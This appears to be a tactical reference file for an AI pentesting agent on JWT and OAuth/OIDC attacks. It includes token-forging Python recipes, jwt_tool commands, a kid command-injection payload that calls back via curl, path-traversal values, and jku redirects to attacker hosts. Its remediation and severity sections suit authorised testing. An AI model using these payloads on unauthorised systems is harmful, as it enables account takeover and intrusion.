---
name: JWT Attacks
description: Reference for JWT/JWS forgery, algorithm confusion, header-driven key abuse, claim manipulation, and OAuth/OIDC token confusion against black-box endpoints.
---

# JWT Attacks

Tactical reference for testing JWT-based authentication: header-driven key control, algorithm confusion, claim tampering, and cross-context token reuse. Pull this in when you have one or more JWTs in scope and need a payload matrix, the right `jwt_tool` invocation, or a quick lookup on `kid` / `jku` / `jwk` abuse.

> Black-box scope: every probe assumes you can capture and replay tokens against running endpoints. There is no source-code analysis step.

## Tool palette

| Action | Tool | Notes |
|---|---|---|
| Forge / mangle / scan a single token | `kali_shell` | `jwt_tool TOKEN -M at` runs all built-in tests; `-T` opens the tampering wizard non-interactively only with explicit `-S` / `-X` flags. |
| Decode + edit a token by hand | `execute_code` | Python with `PyJWT`; full control over header/claims/signing. |
| Replay forged tokens | `execute_curl` | Always observe response code, body length, and any token-bound cookies. |
| OOB callback for `jku` / `x5u` exfil | `kali_shell interactsh-client` | Stand up an interactsh URL, point the header at it. |
| Browser flows (auth code, PKCE, device) | `execute_playwright` | Record the redirect chain to capture `state`, `nonce`, `code`. |
| Pull tokens out of the graph | `query_graph` | "Return endpoints/responses where Authorization headers contain Bearer tokens." |

## Reconnaissance checklist

Before tampering, capture the lay of the land:

| Path | Looking for |
|---|---|
| `/.well-known/openid-configuration` | Issuer, supported algs, `jwks_uri`, `token_endpoint`, `authorization_endpoint`, `revocation_endpoint`, `introspection_endpoint` |
| `/.well-known/oauth-authorization-server` | Same metadata for OAuth-only servers |
| `<jwks_uri>` (often `/jwks.json`, `/.well-known/jwks.json`) | Live signing keys (`kty`, `alg`, `kid`, `n`, `e` or `x`, `y`) |
| `/oauth2/.well-known/...`, tenant-prefixed variants | Multi-tenant rotation keys |
| `/authorize`, `/token`, `/introspect`, `/revoke`, `/logout` | Direct token endpoints |
| `/login`, `/callback`, `/refresh`, `/me`, `/session`, `/impersonate` | Application-side token consumers |

```
execute_curl url: "https://target.tld/.well-known/openid-configuration"
execute_curl url: "https://target.tld/.well-known/jwks.json"
```

Inventory every consumer of the token. Many backends only verify the signature and skip `aud` / `typ` / `iss`; finding such a service is the cheapest win.

## Captured-traffic workflow (proxy_brain tools)

If HTTP Traffic Capture is enabled, source and drive token testing from the recorded history instead of rebuilding requests by hand. proxy_brain tools only see traffic that went through the capture proxy.

- Harvest tokens: `redamon.search({"hasAuth":true})` lists every captured request carrying an Authorization header, and `redamon.grep("eyJ")` / `redamon.grep("Bearer ")` pull Bearer JWTs out of response bodies and JS bundles. This replaces the `query_graph` token pull.
- `redamon.get(<txn_id>, "both")` gives the full request/response of a token-bearing transaction, so you can lift the exact header shape and the endpoint that consumes it.
- Replay forged / mutated tokens against the endpoint they came from: forge the variant with `jwt_tool` or the Python recipes below, then `redamon.replay(<captured_txn>, {"headers":{"Authorization":"Bearer <forged>"}})`. Test alg=none, RS256->HS256, and claim-inflated tokens this way, one per replay.
- Cross-audience acceptance is an auth-swap: `redamon.replay(<service_B_txn>, {"headers":{"Authorization":"Bearer <token_minted_for_service_A>"}})` proves a token for `aud=billing` is accepted by `aud=admin`. For the gateway-trusts-header gap, `redamon.replay(id, {"dropHeaders":["Authorization"],"headers":{"X-User-Id":"1"}})`.
- `redamon.diff(<owner_token_txn>, <forged_token_txn>)` is the two-request PoC the validation section wants: owner-equivalent data returned to the forged token is the finding. `redamon.to_curl(id)` renders it for the report.

Caveat: redamon.replay pins host/scheme/port to the origin transaction, so it cannot replay a token against a different host, gRPC port, or WebSocket consumer (use execute_curl / execute_code for those). Browser-side proof (localStorage exfil via XSS) still needs execute_playwright.

## Anatomy of a token

```
header  = { "alg":"RS256", "typ":"JWT", "kid":"abc-2024", "jku":"...", "x5u":"...", "jwk":{...} }
payload = { "iss":"...", "aud":"...", "azp":"...", "sub":"42", "scope":"read",
            "exp":1735689600, "nbf":..., "iat":..., "typ":"access" }
signature = base64url( sign(header + "." + payload, key) )
```

Things to check in the captured token:

- `alg` value and whether it matches the JWKS-published `alg` for that `kid`
- `kid` format: numeric, UUID, path-shaped (`keys/2024/prod`), or attacker-influenced
- Presence of `jku`, `x5u`, or inline `jwk` in the header
- Whether the `aud` matches the service consuming the token
- Whether `b64=false` and `crit` headers are tolerated

## Attack matrix

| Class | Technique | Quick probe |
|---|---|---|
| **Signature** | `alg=none` | Set header `alg` to `none`/`None`/`NONE`/`nOnE`, drop signature, replay |
| Signature | RS256 -> HS256 confusion | Switch `alg` to `HS256`, sign body with the public key text from JWKS as the HMAC secret |
| Signature | ES256 malleability | Send non-canonical (high-`s`) signature; weak libs accept |
| Signature | Trim signature / null-byte | Send empty signature, or `\x00`-padded base64 |
| **Header key** | `kid` path traversal | `"kid":"../../../../dev/null"` -> server hashes empty file as the HMAC secret |
| Header key | `kid` SQLi | `"kid":"x' UNION SELECT 'AAAA'-- "` if key lookup hits a DB |
| Header key | `kid` command injection | `"kid":"x;curl http://oast/?$(id)"` if key lookup shells out |
| Header key | `jku` redirect | `"jku":"https://attacker.tld/jwks.json"` hosting attacker JWK; sign with matching private key |
| Header key | `x5u` redirect | Same as above with attacker-served PEM chain |
| Header key | Inline `jwk` injection | Embed `"jwk":{...}` in header; weak libs prefer header key over server-configured key |
| Header key | SSRF via JWKS fetch | Point `jku` at internal hosts to map the network or read responses through error messages |
| **Claim** | Privilege inflation | Edit `role`, `scope`, `groups`, `admin`, `is_admin`, `tenant_id`; only works when signature checks are weak |
| Claim | `exp` / `nbf` skip | Omit `exp` or send `exp` in the future; some libs accept missing |
| Claim | `aud` / `iss` swap | Replay an access token at a service expecting a different audience |
| Claim | `typ` / `cty` confusion | Send an ID token where an access token is required |
| Claim | `sub` swap | Replace `sub` after demonstrating signature bypass |
| **OIDC flow** | Mix-up | Swap `client_id` between two RPs sharing the same IdP |
| OIDC flow | PKCE downgrade | Strip `code_challenge` / set `plain` method when the spec mandates `S256` |
| OIDC flow | `state` / `nonce` removal | Drop them and replay; missing CSRF guard means login interception |
| OIDC flow | Refresh reuse | Use a previously-rotated refresh token; absence of reuse detection = persistence |
| **JWS edge** | `b64=false` | Set `"b64":false` and `"crit":["b64"]` with unencoded payload; many libs verify the wrong canonical form |
| JWS edge | Nested JWT | Outer `alg=none` containing a fully signed inner; outer is "verified" while inner claims are still trusted |
| **Transport** | localStorage exfil | If the token lives in `localStorage`, an XSS proves chained takeover |
| Transport | CORS + creds | `*` origin with `credentials:include` lets attacker JS read `/me` |
| Transport | DPoP / mTLS absence | Same token works from any device -> trivial replay |

## jwt_tool quick reference

`jwt_tool` is preinstalled and runs through `kali_shell`.

```
kali_shell: jwt_tool eyJhbGc... -M at                       # all-tests scan (auto)
kali_shell: jwt_tool eyJhbGc... -X a                        # alg=none variants
kali_shell: jwt_tool eyJhbGc... -X k -pk public.pem         # RS256 -> HS256 with public key as HMAC secret
kali_shell: jwt_tool eyJhbGc... -X i -pc role -pv admin     # inject/modify payload claim role=admin
kali_shell: jwt_tool eyJhbGc... -X s -ju https://attacker.tld/jwks.json  # spoof JWKS / jku redirect
kali_shell: jwt_tool eyJhbGc... -V -pk public.pem           # verify signature against a key
```

For `kid` path-traversal and inline-`jwk` injection, jwt_tool's interactive tampering mode (`-T`) is the canonical path. For unattended runs, prefer the Python recipes below: they are cleaner to script than the equivalent `-T`/`-I`/`-hc`/`-hv` flag stack and deterministic for evidence capture.

Targeted run against a live endpoint (replays each forged variant and reports diffs):

```
kali_shell: jwt_tool -t https://target.tld/api/me -rh "Authorization: Bearer eyJhbGc..." -M at
```

The tool stores forged tokens under `~/.jwt_tool/`. Inspect after a run with `kali_shell ls -la ~/.jwt_tool/`.

## Manual forging recipes

### `alg=none` payload

```
execute_code language: python
import base64, json
hdr = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
pl  = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin","exp":9999999999}).encode()).rstrip(b"=").decode()
print(f"{hdr}.{pl}.")
```

### RS256 -> HS256 confusion

```
execute_code language: python
import jwt, base64, json
pub = open("public.pem","rb").read()           # the RSA public key text
header = {"alg":"HS256","typ":"JWT"}
payload = {"sub":"admin","role":"admin","exp":9999999999}
print(jwt.encode(payload, pub, algorithm="HS256", headers=header))
```

### `jku` redirect with attacker-controlled JWKS

```
kali_shell: openssl genrsa -out attacker.key 2048
kali_shell: openssl rsa -in attacker.key -pubout -out attacker.pub
# build JWKS with the pub key and host it on an interactsh / attacker URL
kali_shell: interactsh-client -v
# craft JWT header: { "alg":"RS256", "kid":"any", "jku":"https://<oast>/jwks.json" }
# sign body with attacker.key, replay token, watch interactsh log for callback
```

### `kid` traversal to a known-content file

`kid` can point to a server-resident file the attacker can predict (an empty file, a file with known content, `/proc/self/environ`). The server reads it as the HMAC secret, so signing with the matching content forges any claim set.

```
"kid":"../../../../dev/null"    # secret = empty bytes -> sign body with HMAC("")
"kid":"../../../../etc/hostname"
"kid":"../../../../proc/sys/kernel/random/boot_id"  # if readable, race the boot_id
```

## Microservices and gateway abuses

- Edge gateway adds `X-User-Id` from token claims; backend trusts the header even when token is forged or stripped. Probe by removing the token but keeping the header.
- Async workers consume bearer tokens from queues and skip verification on replay. If you can re-enqueue a captured message, persistence is free.
- Different services pin different `aud`. Token minted for `audience=billing` may be accepted by `audience=admin` if `aud` is unchecked.
- gRPC and WebSocket consumers are common verification gaps. Replay the token over the same TLS session via `wscat`/`grpcurl`.

## Refresh, session, storage

- Refresh tokens without rotation -> reuse indefinitely. Use the same refresh token twice in 60 seconds; both succeeding means no reuse detection.
- Long-lived JWT with no revocation -> token stays valid after logout. Hit `/logout`, retry the original token.
- Tokens in `localStorage` -> any XSS pivots to durable account takeover. Tokens in `Secure HttpOnly` cookies block XSS exfil but do not block CSRF unless `SameSite` is `Lax`/`Strict`.
- Missing DPoP / mTLS -> tokens are device-portable; a stolen token grants access from any IP.

## OIDC and OAuth surface

| Probe | What it proves |
|---|---|
| Strip `state` from the auth request | CSRF on the login flow |
| Strip `nonce` from the auth request | Token replay on ID tokens |
| Submit `code_challenge_method=plain` | PKCE downgrade |
| Submit no PKCE on a public client | Public-client misconfig |
| Swap `redirect_uri` to attacker URL | Code interception (test allowlist strictness) |
| Reuse an authorization `code` twice | Single-use enforcement |
| Replay an ID token at an API expecting access tokens | Token confusion |
| Use a token from Client A at Client B's resource | Audience binding strictness |

## Validation and PoC shape

A clean JWT finding shows two requests:

1. Owner token (legitimate) -> 200 OK, normal response.
2. Forged / cross-context token -> 200 OK with **owner-equivalent data** or **other-user data**.

Capture both with `execute_curl -i` and store the responses. Also keep the forged token, the JWKS at the time of the test, and any callback evidence (interactsh log).

## False positives

- Token rejected with a precise error like `invalid audience` or `invalid issuer` indicates strict binding; do not file as a finding without a bypass.
- JWKS is pinned (TLS-bound) and `jku` is allowlisted; remote-key abuse blocked.
- Short-lived tokens (~60s) with rotation and `revoke` on logout; durable replay impossible.
- ID token rejected at access-only APIs.

## Severity model

- **Critical**: forged token accepted on any privileged path (admin, internal, cross-tenant).
- **High**: cross-context acceptance (audience confusion), refresh reuse without rotation, persistent post-logout access.
- **Medium**: claim manipulation accepted on a low-privilege path, missing PKCE on a public client.
- **Low**: missing `nonce` / `state` without an exploitable redirect chain.

## Remediation summary (for reporting)

- Pin `alg` per `kid` from the JWKS server-side. Reject tokens whose `alg` does not match the published algorithm.
- Reject `alg=none`, `alg=None` and case variants explicitly.
- Whitelist `jku` / `x5u` URLs; never fetch arbitrary URLs from header values.
- Validate `iss`, `aud`, `azp`, `typ`, `exp`, `nbf` on every consumer (gateway, service, worker, WebSocket, gRPC).
- Bind tokens to the device with DPoP or mTLS where threat model warrants.
- Enforce refresh-token rotation with reuse detection; revoke on logout.
- Use `Secure`, `HttpOnly`, `SameSite=Lax`/`Strict` cookies for browser delivery.
- Log and alert on `alg` switches, missing `kid`, `b64=false` headers, and `jku`/`x5u` differing from the configured JWKS endpoint.
